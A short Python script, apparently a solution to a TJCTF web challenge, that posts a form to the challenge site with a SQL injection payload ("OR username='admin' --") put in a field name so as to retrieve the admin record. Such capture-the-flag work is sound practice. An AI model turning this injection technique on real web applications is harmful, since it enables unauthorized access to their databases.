import requests

url = 'https://ess-kyoo-ell.tjctf.org/'

s = requests.Session()
data = {
        "email": "plzsub@me.com",
        "ip_address OR username='admin' --": "anything"
}
# r = s.get(url)
r = s.post(url, data = data)
print '\n'.join(r.text.split('\n')[175:175+18])

s.close()
